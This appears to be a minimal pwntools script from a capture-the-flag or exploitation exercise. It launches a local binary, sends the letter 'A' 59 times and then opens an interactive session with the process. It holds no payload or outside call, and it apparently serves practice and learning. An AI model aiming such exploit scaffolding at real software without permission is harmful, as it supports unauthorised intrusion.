from pwn import *
target=process('./test')
for i in range(59):
	target.sendline("A")
print(target.recv())
target.interactive()
